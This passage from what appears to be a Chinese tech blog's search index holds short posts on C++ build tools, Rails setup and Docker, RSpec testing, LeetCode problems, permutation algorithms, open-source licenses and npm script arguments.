ActiveRecord::Base:Class (NoMethodError)\nrails generate devise:install does nothing\nRails 5 Action Controller Routing error when I remove helper\nRails NoMethodError: undefined method new for BigDecimal:Class\nRolify Table Error (user.add_role :admin Unknown Key Error)\nuninitialized constant ApplicationRecord\n","categories":["Rails","Tips"]},{"title":"各種make","url":"/2020/10/xxmake/","content":"動機\n最近被autoconf弄，所以來記錄一下各種make\n如果需要範例code在github上\n\n手工\nheader是給compiler看，但不管實際上有沒有這些函數的實作\n之後是透過linker去static或是dynamic的地方找code\n這次的範例是有三個cpp(與各自的header)\n\n一個主程式 : main.cpp\nstatic 的 函數 : stc.cpp\ndynamic 的 函數 : dyn.cpp\n\n編的方式\n給I:去哪找header\n給L:去哪找so\n給l:用哪個library(像libdyn.so就是-ldyn)\ng++ -c -o syn.o syn.cppg++ -fPIC -shared -o libdyn.so dyn.cppg++ -I. -o main main.cpp sta.o libdyn.soLD_LIBRARY_PATH=. ./main # LD_LIBRARY_PATH is to indicate where to search .so file\nmake\nmakefile的邏輯很簡單\n\n每個target都有對應要編的檔案\n再編檔案之前都要看前提有沒有滿足\n\n而Makefile為了方便有一些自訂的變數，像\n\n$@: target的名字\n$^: 整串前提\n$&lt;: 所有前提的第一項\n\n那PHONY是為了什麼存在的?\nclean沒有對應的檔案，但可以當成一個假的target去跑\nmain: main.cpp sta.o dyn.so\tg++ -I. -o $@ $^dyn.so: dyn.cpp\tg++ -fPIC -shared -o $@ $^%.o: %.cpp\tg++ -c -o $@ $&lt;\t# current , firstclean:\trm *.o *.so.PHONY: clean\nautoconf\n整個步驟如下\n\nautoscan\nmv configure.scan configure.in\n改 configure.in\n寫 Makefile.am\nautoreconf -i\n./configure\nmake\n\n很長，也很眼花撩亂\n先看configure.in，主要是看有EDIT或是ADD的那幾行\n#                                               -*- Autoconf -*-# Process this file with autoconf to produce a configure script.AC_PREREQ([2.69])#AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS])AC_INIT(main, 1.0.0, 123456@gmail.com) # EDITAC_CONFIG_SRCDIR([main.cpp])AM_INIT_AUTOMAKE([foreign -Wall -Werror])  # EDIT, optionalAC_CONFIG_HEADERS([config.h])# autoreconf complain ,so add this lineAC_CONFIG_MACRO_DIRS([m4]) # ADD this to stop complaining# Checks for programs.AC_PROG_CXXAC_PROG_CC# Checks for libraries.LT_INIT # ADD this, cuz we have .so file# Checks for header files.# Checks for typedefs, structures, and compiler characteristics.# Checks for library functions.AC_CONFIG_FILES([Makefile])AC_OUTPUT\n再來是Makefile.am，同樣看註解\nAUTOMAKE_OPTIONS=foreign  # autoreconf complain, so add this lineACLOCAL_AMFLAGS = -I m4# program !!bin_PROGRAMS=main main_SOURCES=main.cpp sta.cpp include_HEADERS = sta.h dyn.h# Add out .so filelib_LTLIBRARIES = libdyn.lalibdyn_la_SOURCES = dyn.cpp# link .so file after compiling has doneLDADD = libdyn.la\ncmake\n人性化的多，只要一個CMakeLists.txt，就沒事了\n比較需要注意的是CMAKE_SOURCE_DIR與CMAKE_BINARY_DIR\n\nAssuming that you have 2 folders src and build where src contains your projects and build is the empty folder that you just created so you can deploy your out-of-tree build in it:\nCMAKE_SOURCE_DIR is the path to src where CMAKE_BINARY_DIR points to build.\n\nCMAKE_CURRENT_SOURCE_DIR =&gt;  CMakeLists.txt在?\nCMAKE_CURRENT_BINARY_DIR =&gt; cmake正在哪裡跑?\n感覺這根本不用解釋，看就懂了\ncmake_minimum_required (VERSION 3.16)project(main CXX)include_directories( $&#123;CMAKE_SOURCE_DIR&#125; )link_directories( $&#123;CMAKE_SOURCE_DIR&#125; )set(main_SOURCES    main.cpp    sta.cpp)add_library(dyn            SHARED            dyn.cpp)set(main_LIBS    dyn)add_executable( $&#123;PROJECT_NAME&#125; $&#123;main_SOURCES&#125; )target_link_libraries( $&#123;PROJECT_NAME&#125; $&#123;main_LIBS&#125; )\nRef\nCMake 入門\ncmake与autoconf+automake的对比\n构建Make,Automake,CMake\nUsing Automake and Autoconf\nxmake vs cmake对比分析\nWhere is CMAKE_SOURCE_DIR?\n","categories":["C++","Tips"]},{"title":"設計狀態之前","url":"/2020/11/design-state/","content":"動機\n說說setup專案的步驟與後面用到的觀念\n\nSetup\nPROJECT_NAME=demo# install yarncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -echo &quot;deb https://dl.yarnpkg.com/debian/ stable main&quot; | sudo tee /etc/apt/sources.list.d/yarn.listsudo apt-get update &amp;&amp; sudo apt-get install yarn# new projectrails new $PROJECT_NAME --api &amp;&amp; cd $PROJECT_NAMEbundle install\ndevise\n\nRemove gem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby]\nAdd gem &quot;devise&quot;\nRun rails generate devise:install\n\nPolymorphic Association\n這裡要把devise的user與之後的Reader和Librarian，做Polymorphic Association\n加reference\n要加新的reference到user中，\n\n加新的migration\n改user的migration\n\n加新的migration\nrails g migration add_role_users role:references\\&#123;polymorphic\\&#125;\n這裡有個慣例add_&#123;column name&#125;_to_&#123;model class name&#125;，這樣就不用自己改migration的rb\nmigration裡面會是\nclass AddRoleToUsers &lt; ActiveRecord::Migration[6.0]  def change    add_reference :users, :role, polymorphic: true, null: false  endend\n改user的migration\ncreate_table :users do |t|  # ......  t.belongs_to :role, :polymorphic =&gt; trueend\nsimple usage\nr = Reader.newr.saveu = User.new :email =&gt; &quot;a@a.com&quot;, :password =&gt; &quot;123456789&quot;u.role = ru.save\nSingle Table Inherence\n兩個model共用同一個table，但是執行在column上的method會看model的method來跑\n多一個type column\ncreate_table :Ticket do |t|  t.string :typeend\nmodel 繼承\nclass Lending &lt; Ticket#....end\nsimple usage\nr = Lending.creater.type# Lending\n所以也有另一種繼承(Multiple Table Inherence)是兩個model分別有自己的table，但是卻共用同一個model的method\nassm\naasm就是狀態機，這邊說說設計上的注意點\n\ncallback只有after與guard可以傳參數\n參數最好直接傳hash\n所有callback都要抽成private method，之後測試才能stub\n注意: 當after失敗時，他不會自動rollback狀態\n\nRef\ndevise\nAdding Custom Fields to Devise\nassm\nState machines in Rails 5\n","categories":["Rails","Tips"]},{"title":"把Rails包成Docker","url":"/2020/11/dockerize-rails/","content":"動機\n讓執行環境一致，與讓setup方便一點的時候到了(其實setup在docker還是有問題要處理…)\n\nDB &amp; docker-compose\ndocker-compose比起k8s操作起來比較簡單，基本上就是把所有container放到同一個netns\nversion: &#x27;3.1&#x27;services:  db:    image: mariadb    restart: always    environment:      MYSQL_ROOT_PASSWORD: mypw      MYSQL_DATABASE: mydb  app:    build: .    ports:      - &quot;3000:3000&quot;    depends_on:      - db\nRails image\nDockerfile\n基本上就是\n\n裝dep\ncopy code\n裝plugins(gem)\nRun it\n\nFROM ruby:2.7.2 AS setup_envMAINTAINER fengzheng &lt;fengzheng@me.com&gt;RUN apt update &amp;&amp; apt-get install -y build-essential nodejs imagemagick libmariadbclient-devFROM setup_env AS install_gemsRUN mkdir /appWORKDIR /appCOPY Gemfile* /app/RUN bundle installFROM install_gemsCOPY . /appWORKDIR /app# The connection was resetCMD rails s --binding 0.0.0.0\n不過如果用一般的image(ubuntu)會很肥，所以改用alpine\n但改用不同發行版，要注意有些dep可能會缺失，像這裡是tzdata\n還有安裝的dep在不同發行版也不同\nFROM ruby:2.7.2-alpine AS setup_envMAINTAINER fengzheng &lt;fengzheng@me.com&gt;ENTRYPOINT [&quot;rails&quot;]#RUN apt update &amp;&amp; apt-get install -y build-essential nodejs imagemagick libmariadbclient-dev# Add `gem &#x27;tzinfo-data&#x27;` to the Gemfile. # Add `tzdata` to the Dockerfile# ZInfo::DataSourceNotFound: tzinfo-data is not present. Please add gem &#x27;tzinfo-data&#x27; to your Gemfile and run bundle install RUN apk update &amp;&amp; apk upgrade &amp;&amp; apk add --update --no-cache build-base nodejs imagemagick mariadb-dev tzdataFROM setup_env AS install_gemsRUN mkdir /appWORKDIR /appCOPY Gemfile* /app/RUN bundle installFROM install_gemsCOPY . /appWORKDIR /app# The connection was resetCMD [&quot;s&quot;, &quot;--binding&quot;, &quot;0.0.0.0&quot;]\ndatabase.yml\nencoding: utf8reconnect: falsedatabase: mydbhost: db # HEREpool: 5username: rootpassword: &quot;mypw&quot;\nEncountered Problems\nUnknown MySQL server host ‘db’ (-2)\n通常是db的container還沒開完，可能container已經是running但，裡面的程式還沒跑起來\n現在找到的做法是\n\n在啟動時sleep (手工或是wait-for-it.sh)\nrestart: on-failure\n自己一個一個啟動\n\nThe connection is reset by peer\n一般rails s都是聽在127.0.0.1，所以透過container的資料都不會被收到，\n因為那些資料一定不是來自127.0.0.1。\n所以解法是讓server聽在0.0.0.0上，rails s --binding 0.0.0.0\ntzinfo-data is not present. Please add gem ‘tzinfo-data’ to your Gemfile and run bundle install (TZInfo::DataSourceNotFound)\n如果直接去裝tzinfo-data的gem會報錯，說沒有在linux platform上的gem可以用。\n實際上就是要透過package manager去裝tzdata\napk add --update --no-cache tzdata\n","categories":["Rails","Tips"]},{"title":"第一次rpsec","url":"/2020/11/first-rpsec/","content":"動機\n寫寫第一次用rpsec的感想\n\n用subject\n雖然說用subject比較長，但是通用，如果搭配shared example，會看出效果\nstub不好用，但需要\n現在rspec3的stub是做在rspec自己的double上，所以如果有一個model會call到另一個model的callback會很難過，因為不能利用rspec3的stub\n這個時候就只能用rspec2的stub，這樣就可以stub任意class的method，但會吃警告訊息\n通常如果出現什麼nil沒有method之類的，就是因為沒有相依的model還有其callback\nrecevied有沒有用?\nrecevied的matcher好像只能搭配rspec3的stub\n但rspec2的stub就不知道能不能用了，要確認\n但好像沒有成功\n資料生成真的很麻煩，怪不得需要factorybot\nmodel如果是獨立的就算了，如果是會互相影響狀態就準備崩潰\n而且如果有callback就還要用create才會有辦法從model去拉資料，這樣才符合使用情境\n但這會耗db資源，所以需要mock。\n但是rpsec的mock就像是空白元件一樣，不管什麼都要自己寫，這樣無法展現到model之間的關係，用這種mock就像都是自己編的一樣，不一定是照code來的疑慮會一直都在。\n雖說是DSL但其實是ruby的class與instance\n除了shared example這種rpsec提供的整理的方式，還是可以用method去整理\n抽象有助於測試更多\n原本測可以用的event是用allow_event去一個一個比\n但是抽象之後，而注意到可以用not_to allow_event來測不該去的event\n這樣就連sink state都可以被測試了\n測試寫的code不比model少\n因為兩邊其實要配合，所以就是在兩邊改來改去，在測試還要想stub與mock，十分痛苦\n測試可以當成備忘錄\n因為可以pending，所以可以幫想到的需求與條件寫下來，在跑測試時會提醒\n光是這點，就可以讓我愛上測試\n用適合的matcher\n雖然說都可以用eq，但用對matcher可以省下一些code，像比對array如果只用eq就要先把array排序再比，但match_array可以直接處理\n測試也是會有bug\n像在測sink state的allow event，就有看到類似\n\nexpect :lost would be :lost\n\n這種奇怪的東西，之後是把帶有sink state的model從expect中拿掉，換成新的剛出生的model才變的正常\n","categories":["Rails","Tips"]},{"title":"設計model","url":"/2020/11/how-design-model-and-schema/","content":"動機\n上次把功能訂出來了，接著就是設計model與schema\n\nWhat is Model?\nRails的model其實身兼三種角色\n\n從DB拿資料 (或是說翻譯SQL與相關DB操作)\n提供資料給Controller(view) (或是說把DB的資料轉成ruby看得懂的data)\n處理資料之間的邏輯\n\n從資料的角度來看，原本的DB是\n\n放資料\n讀資料\n\n所以一般不會在DB做運算，除非很明顯必須在那邊做\n不然轉回來backend這邊做明顯比較好\n故，model其實可以切成兩個部分(沿用這裡的說法)\n\nData Mapper\n\n\n從DB拿資料\n提供資料給Controller(view)\n\n\nDomain Objects (Service，就是Domain Objects的public method，換言之，給Controller呼叫的部分)\n\n\n處理資料之間的邏輯\n\n這個也同時在說model不等於DB，\n不要把操作model只當成操作DB\n如何設計Model以及schema\nSchema(DB的table)會放什麼\n\n本身的屬性 (身高、血型等)\n連到其他地方的外鍵 (ptr)\n\n與Model(或是說orm)相關的部分是連到其他地方的外鍵\n這決定要用什麼Association\n所以可以照這樣設計\n\n有什麼角色(或資料)\n角色之間的關係是\n各自有什麼屬性，以及條件(像不為空等)\n\n而rails有migration，所以可以在需要時擴充屬性\n也有validation可以驗證屬性\n所以重要的是關係以及自己的商業邏輯\nRef\nHow should a model be structured in MVC?\nSee also: Building Rich Domain Models in Rails.\n","categories":["Rails","Tips"]},{"title":"leetcode-10 - Regular Expression Matching","url":"/2020/11/leetcode-10/","content":"動機\ndp就是把所有可能性，encode成index在matrix上記錄，在求解時利用index去取得答案\n\nProblem\nGiven an input string s and a pattern p, implement regular expression matching with support for '.' and '*' where:'.' Matches any single character.ââââ'*' Matches zero or more of the preceding element.The matching should cover the entire input string (not partial). Example 1:Input: s = aa, p = aOutput: falseExplanation: a does not match the entire string aa.Example 2:Input: s = aa, p = a*Output: trueExplanation: '*' means zero or more of the preceding element, 'a'. Therefore, by repeating 'a' once, it becomes aa.Example 3:Input: s = ab, p = .*Output: trueExplanation: .* means zero or more (*) of any character (.).Example 4:Input: s = aab, p = c*a*bOutput: trueExplanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches aab.Example 5:Input: s = mississippi, p = mis*is*p*.Output: false Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Recursion","Dynamic Programming","String"]},{"title":"leetcode-120 - Triangle","url":"/2020/11/leetcode-120/","content":"動機\n經典的dp\n\nProblem\nGiven a triangle array, return the minimum path sum from top to bottom.For each step, you may move to an adjacent number of the row below. More formally, if you are on index i on the current row, you may move to either index i or index i + 1 on the next row. Example 1:Input: triangle = [[2],[3,4],[6,5,7],[4,1,8,3]]Output: 11Explanation: The triangle looks like:   2  3 4 6 5 74 1 8 3The minimum path sum from top to bottom is 2 + 3 + 5 + 1 = 11 (underlined above).Example 2:Input: triangle = [[-10]]Output: -10 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-200 - Number of Islands","url":"/2020/11/leetcode-200/","content":"動機\n經典的dfs\n\nProblem\nGiven an m x n 2D binary grid grid which represents a map of '1's (land) and '0's (water), return the number of islands.An island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water. Example 1:Input: grid = [  [1,1,1,1,0],  [1,1,0,1,0],  [1,1,0,0,0],  [0,0,0,0,0]]Output: 1Example 2:Input: grid = [  [1,1,0,0,0],  [1,1,0,0,0],  [0,0,1,0,0],  [0,0,0,1,1]]Output: 3 Constraints:m == grid.lengthn == grid[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Matrix","Union Find","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-213 - House Robber II","url":"/2020/11/leetcode-213/","content":"動機\n控制input的dp\n\nProblem\nYou are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have a security system connected, and it will automatically contact the police if two adjacent houses were broken into on the same night.Given an integer array nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police. Example 1:Input: nums = [2,3,2]Output: 3Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2), because they are adjacent houses.Example 2:Input: nums = [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).Total amount you can rob = 1 + 3 = 4.Example 3:Input: nums = [0]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-227 - Basic Calculator II","url":"/2020/11/leetcode-227/","content":"動機\n就是算數，但不要被資料結構的postfix誤導，堅持都用stack的方式去iterate所有數字\n\nProblem\nGiven a string s which represents an expression, evaluate this expression and return its value. The integer division should truncate toward zero.Note: You are not allowed to use any built-in function which evaluates strings as mathematical expressions, such as eval(). Example 1:Input: s = 3+2*2Output: 7Example 2:Input: s =  3/2 Output: 1Example 3:Input: s =  3+5 / 2 Output: 5 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["String","Stack","Math"]},{"title":"leetcode-304 - Range Sum Query 2D - Immutable","url":"/2020/11/leetcode-304/","content":"動機\n就是一維的推廣\n\nProblem\nGiven a 2D matrix matrix, handle multiple queries of the following type:Calculate the sum of the elements of matrix inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).Implement the NumMatrix class:NumMatrix(int[][] matrix) Initializes the object with the integer matrix matrix.int sumRegion(int row1, int col1, int row2, int col2) Returns the sum of the elements of matrix inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2). Example 1:Input[NumMatrix, sumRegion, sumRegion, sumRegion][[[[3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]], [2, 1, 4, 3], [1, 1, 2, 2], [1, 2, 2, 4]]Output[null, 8, 11, 12]ExplanationNumMatrix numMatrix = new NumMatrix([[3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]);numMatrix.sumRegion(2, 1, 4, 3); // return 8 (i.e sum of the red rectangle)numMatrix.sumRegion(1, 1, 2, 2); // return 11 (i.e sum of the green rectangle)numMatrix.sumRegion(1, 2, 2, 4); // return 12 (i.e sum of the blue rectangle) Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Prefix Sum","Design"]},{"title":"leetcode-31 - Next Permutation","url":"/2020/11/leetcode-31/","content":"動機\n這是經典演算法，基本上沒有寫過就要在面試時寫出來，應該十分困難\n\nProblem\nImplement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.If such an arrangement is not possible, it must rearrange it as the lowest possible order (i.e., sorted in ascending order).The replacement must be in place and use only constant extra memory. Example 1:Input: nums = [1,2,3]Output: [1,3,2]Example 2:Input: nums = [3,2,1]Output: [1,2,3]Example 3:Input: nums = [1,1,5]Output: [1,5,1]Example 4:Input: nums = [1]Output: [1] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve"],"tags":["Array","Two Pointers"]},{"title":"leetcode-338 - Counting Bits","url":"/2020/11/leetcode-338/","content":"動機\n在奇偶性上做dp\n\nProblem\nGiven an integer n, return an array ans of length n + 1 such that for each i (0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Bit Manipulation"]},{"title":"leetcode-4 - Median of Two Sorted Arrays","url":"/2020/11/leetcode-4/","content":"動機\n這題體現了二分法是一種藝術\n\nProblem\nGiven two sorted arrays nums1 and nums2 of size m and n respectively, return the median of the two sorted arrays.The overall run time complexity should be O(log (m+n)). Example 1:Input: nums1 = [1,3], nums2 = [2]Output: 2.00000Explanation: merged array = [1,2,3] and median is 2.Example 2:Input: nums1 = [1,2], nums2 = [3,4]Output: 2.50000Explanation: merged array = [1,2,3,4] and median is (2 + 3) / 2 = 2.5.Example 3:Input: nums1 = [0,0], nums2 = [0,0]Output: 0.00000Example 4:Input: nums1 = [], nums2 = [1]Output: 1.00000Example 5:Input: nums1 = [2], nums2 = []Output: 2.00000 Constraints:nums1.length == mnums2.length == n0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Divide and Conquer","Binary Search"]},{"title":"leetcode-43 - Multiply Strings","url":"/2020/11/leetcode-43/","content":"動機\n這題是考細心，基本上一般人都知道做法，\n但是要實作就是細細思考，處理小細節\n同時善用function去包常call的操作，降低實作的複雜度，以免在寫出來之前頭腦先爆炸\n\nProblem\nGiven two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string.Note: You must not use any built-in BigInteger library or convert the inputs to integer directly. Example 1:Input: num1 = 2, num2 = 3Output: 6Example 2:Input: num1 = 123, num2 = 456Output: 56088 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Math","Simulation"]},{"title":"leetcode-5 - Longest Palindromic Substring","url":"/2020/11/leetcode-5/","content":"動機\n的確是dp，但也可以不用dp…\n好像只要是回文都可以用列舉中央去解\n\nProblem\nGiven a string s, return the longest palindromic substring in s. Example 1:Input: s = babadOutput: babNote: aba is also a valid answer.Example 2:Input: s = cbbdOutput: bbExample 3:Input: s = aOutput: aExample 4:Input: s = acOutput: a Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-721 - Accounts Merge","url":"/2020/11/leetcode-721/","content":"動機\nemail會在不同的人之間重複，這樣要讓這兩個人合起來\n這裡的任務是\n\n如何找出有重複的人\n如何合起來\n\n\nProblem\nGiven a list of accounts where each element accounts[i] is a list of strings, where the first element accounts[i][0] is a name, and the rest of the elements are emails representing emails of the account.Now, we would like to merge these accounts. Two accounts definitely belong to the same person if there is some common email to both accounts. Note that even if two accounts have the same name, they may belong to different people as people could have the same name. A person can have any number of accounts initially, but all of their accounts definitely have the same name.After merging the accounts, return the accounts in the following format: the first element of each account is the name, and the rest of the elements are emails in sorted order. The accounts themselves can be returned in any order. Example 1:Input: accounts = [[John,johnsmith@mail.com,john_newyork@mail.com],[John,johnsmith@mail.com,john00@mail.com],[Mary,mary@mail.com],[John,johnnybravo@mail.com]]Output: [[John,john00@mail.com,john_newyork@mail.com,johnsmith@mail.com],[Mary,mary@mail.com],[John,johnnybravo@mail.com]]Explanation:The first and third John's are the same person as they have the common email johnsmith@mail.com.The second John and Mary are different people as none of their email addresses are used by other accounts.We could return these lists in any order, for example the answer [['Mary', 'mary@mail.com'], ['John', 'johnnybravo@mail.com'], ['John', 'john00@mail.com', 'john_newyork@mail.com', 'johnsmith@mail.com']] would still be accepted.Example 2:Input: accounts = [[Gabe,Gabe0@m.co,Gabe3@m.co,Gabe1@m.co],[Kevin,Kevin3@m.co,Kevin5@m.co,Kevin0@m.co],[Ethan,Ethan5@m.co,Ethan4@m.co,Ethan0@m.co],[Hanzo,Hanzo3@m.co,Hanzo1@m.co,Hanzo0@m.co],[Fern,Fern5@m.co,Fern1@m.co,Fern0@m.co]]Output: [[Ethan,Ethan0@m.co,Ethan4@m.co,Ethan5@m.co],[Gabe,Gabe0@m.co,Gabe1@m.co,Gabe3@m.co],[Hanzo,Hanzo0@m.co,Hanzo1@m.co,Hanzo3@m.co],[Kevin,Kevin0@m.co,Kevin3@m.co,Kevin5@m.co],[Fern,Fern0@m.co,Fern1@m.co,Fern5@m.co]] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Array","Union Find","Breadth-First Search","Depth-First Search"]},{"title":"下一/前一排序","url":"/2020/11/next-prev-perm/","content":"動機\n詳細的可以看Algorithm, Leetcode-31\n\n步驟\n\n找合法的升序或降序到哪\n把前一個數字換到這個序列\nreverse這序列\n\nnext perm\ndef findStartOfRevOrder(arr):    i = len(arr)-1 # start from the last index    while i &gt; 0 and arr[i-1] &gt;= arr[i]:        i -= 1    return i if i &gt; 0 else -1def f(arr):    i = findStartOfRevOrder(arr)-1    while i &gt;= 0:        j = len(arr)-1        while j &gt;= 0 and arr[i] &gt;= arr[j]: # keep the small ones in last AND skip the pos with the same digit            j -= 1        if j &gt;= 0:            # swap            arr[i], arr[j] = [arr[j],arr[i]]            arr[i+1:] = arr[i+1:][::-1] # keep big digit as the last            i = findStartOfRevOrder(arr)-1            yield arr        else:            break\nprev perm\ndef findStartOfAscOrder(arr):    i = len(arr)-1 # start from the last index    while i &gt; 0 and arr[i-1] &lt;= arr[i]:        i -= 1    return i if i &gt; 0 else -1def g(arr):    i = findStartOfAscOrder(arr)-1    while i &gt;= 0:        j = len(arr)-1        while j &gt;= 0 and arr[i] &lt;= arr[j]: # keep the small ones in last AND skip the pos with the same digit            j -= 1        if j &gt;= 0:            # swap            arr[i], arr[j] = [arr[j],arr[i]]            arr[i+1:] = arr[i+1:][::-1] # keep small digit as the last            i = findStartOfAscOrder(arr)-1            yield arr        else:            break","categories":["Algorithm","Classic"]},{"title":"OpenSource授權","url":"/2020/11/open-source-license/","content":"動機\n因為授權的緣故讓我以為我做了一個禮拜的白工，\n到之後再花一個禮拜生出替代方案，\n最後發現其實最初的方案可以用，不過這時最初的code已經不知道跑到哪裡去了QwQ\n所以整理一下常見的開源授權，讓自己下次不要再被婊了QQ\n\n如何使用、如何修改、如何釋出\n\n使用\n\n\n引用(動態連結)\n整包使用\n\n\n修改\n\n\n改一部分的code\n擴充code(衍生)\n\n\n發布\n\n\nsource code\nbinary\n使用權(像PaaS或SaaS，code都是在自己的機器上跑，其實不算一般的發布)\n\n授權會要求的是?\n\n開放原始碼\n保留copyright(在code最上面的那一大串)\n保留License\n附上修改聲明\n\n看看有什麼授權\n下面提到的授權都要求\n\n保留copyright(在code最上面的那一大串)\n保留License\n\n但寫出來的code要不要\n\n開放原始碼\n用同一個授權(感染)\n附上修改聲明 (這就GPL系列與Apache要)\n是有變化的\n\n開放原始碼\nApache, BSD, MPL, MIT\n\n使用\n\n\n引用(動態連結) =&gt; X\n整包使用 =&gt; X\n\n\n修改\n\n\n改一部分的code =&gt; X\n擴充code(衍生) =&gt; X\n\n\n發布\n\n\nsource code =&gt; X\nbinary =&gt; X\n使用權 =&gt; X\n\nGPL\n\n使用\n\n\n引用(動態連結) =&gt; O\n整包使用 =&gt; O\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\n\n發布\n\n\nsource code =&gt; O\nbinary =&gt; O\n使用權 =&gt; X\n\nLGPL\n\n使用\n\n\n引用(動態連結) =&gt; X\n整包使用 =&gt; O\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\n\n發布\n\n\nsource code =&gt; O\nbinary =&gt; O\n使用權 =&gt; X\n\nAGPL\n\n使用\n\n\n引用(動態連結) =&gt; O\n整包使用 =&gt; O\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\n\n發布\n\n\nsource code =&gt; O\nbinary =&gt; O\n使用權 =&gt; O\n\n寫出來的code要不要用同一個授權(感染)\n這邊基本上是與code有關，所以下面列出的使用情境會把發布省略掉\nBSD, Apache, MIT\n\n使用\n\n\n引用(動態連結) =&gt; X\n整包使用 =&gt; X\n\n\n修改\n\n\n改一部分的code =&gt; X\n擴充code(衍生) =&gt; X\n\nMPL\n\n使用\n\n\n引用(動態連結) =&gt; X\n整包使用 =&gt; X\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\nGPL, AGPL\n\n使用\n\n\n引用(動態連結) =&gt; O\n整包使用 =&gt; O\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\nLGPL\n\n使用\n\n\n引用(動態連結) =&gt; X\n整包使用 =&gt; O\n\n\n修改\n\n\n改一部分的code =&gt; O\n擴充code(衍生) =&gt; O\n\n等等，MIT,BSD與Apache差在哪裡?\nApache把所有授權範圍都寫得好好的，但BSD只有三句話(還有兩句話)\nMIT更少只有一句話\nMIT與BSD的兩句話版本 只要求\n\n保留copyright\n保留License\n\nBSD的三句話版本 要求\n\n保留copyright\n保留License\n不要用作者的名字做行銷\n\nApache寫了很多，需要注意的(與code有關的)是附上修改聲明，註明改過的地方\nRef\n開放源碼授權概觀（上）\n開放源碼授權概觀（下）\nOpen Source授權條款整理\nChoose an open source license\n常見的五個開源專案授權條款，使用軟體更自由\n在開源時代的興起下，如何透過License共享並保有權益\n開放原始碼(開源)授權(Open Source License)比較：GPL, LGPL, BSD, Apache, MIT\n五種開源授權規範的比較 (BSD, Apache, GPL, LGPL, MIT)\n[開源教]教我正確選擇軟體授權\n","categories":["Etc"]},{"title":"如何在npm run中拿到參數","url":"/2020/11/pass-args-to-npm-run/","content":"動機\nnpm run很方便，但是基本上只能傳一個參數\n所以要繞一點彎，來接收參數\n\nSol\n就是用bash的function包起來，在執行function就可以透過bash的參數區拿參數\n但是這只能跑在bash上，如果是windows就不行了\n&quot;draft&quot;: &quot;run()&#123; echo \\&quot;args: $1 $2\\&quot;; &#125;; run&quot;\nRef\nPassing arguments to npm script in package.json\n","categories":["Javascript","Tips"]},{"title":"rails的orm的繼承","url":"/2020/11/rails-orm-inherence/","content":"動機\n整理一下，因為剛好有用到\n\n整理\n\n\n\n\n共用table\n不共用table\n\n\n\n\n共用method\nPolymorphic Association\nMultiple Table Inheritance\n\n\n不共用method\nSingle Table Inheritance\nX\n\n\n\nSingle Table Inheritance用處\n\nsubclass只差在model的使用或是資料操作方式\n所有row都在同一個table\n\nusage\nclass A &lt; ActiveRecord::Baseendclass B &lt; A    def fly  endendclass C &lt; B    def fly  endend\nMultiple Table Inheritance用處\n\nsubclass的model的使用或是資料操作方式有很大一部分都是差不多的\n所有row都在各自的table\n\nusage\nclass A &lt; ActiveRecord::Base  def eat  endendclass B &lt; Animal  set_table_name &quot;B&quot;    def fly  endendclass C &lt; Animal  set_table_name &quot;C&quot;    def run  endend\nPolymorphic Association用處\n\n有一部份method與資料都是一樣的\n有一部份row在別的table\n\nusage\nclass A &lt; ActiveRecord::Base  belongs_to :part_of_A, polymorphic: true  def eat  endendclass B &lt; Animal  has_one :a, as: :part_of_A    def fly  endendclass C &lt; Animal  has_many :as, as: :part_of_A    def run  endend\nRef\nWhen To Use Single Table Inheritance vs Multiple Table Inheritance\n淺談delegate\nSTI , MTI 與多型關聯\nActiveRecord - 